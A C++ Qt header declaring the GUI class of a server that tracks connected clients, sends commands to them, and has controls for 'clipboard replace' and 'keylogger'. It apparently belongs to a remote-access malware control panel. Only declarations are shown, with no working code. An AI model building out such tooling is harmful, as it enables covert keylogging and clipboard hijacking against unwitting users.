#ifndef SERVER_H
#define SERVER_H

#include <QMainWindow>
#include "serverthread.h"
#include <iostream>
#define WIN32_LEAN_AND_MEAN

QT_BEGIN_NAMESPACE
namespace Ui { class server; }
QT_END_NAMESPACE
unsigned int __stdcall ServClient(void *data);
class server : public QMainWindow
{
    Q_OBJECT

public:
    explicit server(QWidget *parent = nullptr);
    ~server();
    serverThread *mainServerThread;

private:
    Ui::server *ui;
    int countOfClients;
    int valueOfProgressBar;
    bool isStop;
    std::string lastCommand;
    bool clipboardChange;
    bool keyloggerChange;

public slots:
    void onChangeCountOfClients(int);
    void onChangeProgressBarValue(int);
    void onAppendConsoleLog(std::string,std::string);


    void onLastCommandChangeValue(std::string);
    std::string onLastCommandGetValue();

private slots:
    // for Start button
    void on_startButton_clicked();
    // for Stop button
    void on_stopClientsConnectionBtn_clicked();
    // for send again command
    void on_sendAgainBtn_clicked();
    // for input
    void on_input_returnPressed();
    // for clipboard
    void on_clipboardReplace_clicked();
    void on_keyLogger_clicked();
};
#endif // SERVER_H
